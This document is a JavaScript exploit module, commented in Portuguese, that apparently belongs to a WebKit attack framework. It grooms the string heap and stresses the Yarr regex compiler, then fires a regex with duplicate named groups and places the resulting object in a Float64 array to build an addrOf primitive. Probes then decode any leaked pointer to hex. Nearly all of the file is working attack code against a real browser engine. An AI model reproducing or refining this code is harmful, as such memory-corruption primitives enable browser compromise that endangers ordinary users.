import { Groomer } from '../mod_groomer.js';

export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva AddrOf: Recria a tempestade de memória no compilador Yarr C++ ' +
        'compilando 4 regex pesadas antes de disparar o alvo (dupNamed), forçando ' +
        'o ponteiro do objeto corrompido para dentro de um Array de decimais (Float64).',

    setup: function() {
        this.results = {};
        this.regexps = {};
        
        // A ARMADILHA: Array de Doubles. 
        // O C++ tentará guardar o ponteiro de um objeto corrompido aqui.
        this.addrofArray = [1.1, 2.2, 3.3, 4.4]; 
    },

    trigger: function() {
        // 1. Grooming Global: Criamos o caos no JSString Heap
        let stringTrash = Groomer.sprayStrings(64, 5000);
        Groomer.punchHoles(stringTrash, 3);

        // 2. A TEMPESTADE DO YARR: Restaurei as 4 compilações pesadas.
        // O único objetivo destas linhas é estraçalhar a matemática do alocador do WebKit.
        try { this.regexps.manyGroups = new RegExp('(a)'.repeat(0x10000)); } catch(e) {}
        try { this.regexps.deepBackref = new RegExp('(a)\\65536'); } catch(e) {}
        try { this.regexps.bigQuant = new RegExp('a{0,65535}'); } catch(e) {}
        try { this.regexps.deepAlt = new RegExp(Array.from({length: 1000}, (_, i) => `alt${i}`).join('|')); } catch(e) {}

        // 3. O GATILHO (O que causou o TypeError no seu log)
        try {
            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
            
            // Lemos o '.groups' exatamente como no script antigo!
            let execRes = this.regexps.dupNamed.exec('a');
            this.results.rawObj = execRes ? execRes.groups : null;
            
            // 4. A TENTATIVA DE ADDROF
            // Injetamos o objeto possivelmente corrompido no array nativo.
            this.addrofArray[0] = this.results.rawObj;
            
        } catch(e) { 
            this.results.error = e.constructor.name; 
        }
    },

    probe: [
        // Probe 0: O objeto foi criado sem travar a engine?
        s => typeof s.results.rawObj,
        
        // Probe 1: O motor ainda consegue ler a estrutura sem dar o TypeError?
        s => {
            try {
                if (!s.results.rawObj) return 'null';
                return 'Objeto lido sem crash';
            } catch(e) {
                return `Corrupção atingida: ${e.message}`;
            }
        },
        
        // Probe 2: O LEITOR DE PONTEIROS (ADDR OF)
        s => {
            try {
                let val = s.addrofArray[0];
                
                // Se o WebKit gravou o ponteiro bruto em vez do objeto,
                // o tipo lido do array mudará magicamente de 'object' para 'number'
                if (typeof val === 'number' && val !== 1.1) {
                    
                    // Decodifica o Double (Float64) para Hexadecimal
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const ptr = new BigUint64Array(buf)[0];
                    
                    const hexPtr = `0x${ptr.toString(16).padStart(16, '0')}`;
                    return `💥 SUCESSO AddrOf (Ponteiro Vazado): ${hexPtr}`;
                }
                
                return 'Proteção Ativa: Ainda tratado como objeto';
            } catch(e) {
                return `Erro no AddrOf: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        this.results = {};
        this.regexps = {};
        this.addrofArray = null;
    }
};
